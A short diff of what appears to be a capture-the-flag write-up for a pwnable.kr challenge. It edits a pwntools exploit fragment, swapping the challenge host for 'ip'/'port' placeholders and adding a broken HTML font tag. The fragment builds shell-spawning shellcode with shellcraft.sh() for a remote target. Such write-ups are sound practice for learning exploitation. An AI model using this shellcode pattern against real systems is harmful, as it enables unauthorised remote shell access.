@@ -22,9 +22,9 @@ echo $((0x48-0x14))
 ```
 from pwn import *
 
-# 0xcafebabe
+<font color="red"># 0xcafebabe<font>
 
-r = remote('pwnable.kr', '9000')
+r = remote('ip', 'port')
 
 shell = asm(shellcraft.sh())
 
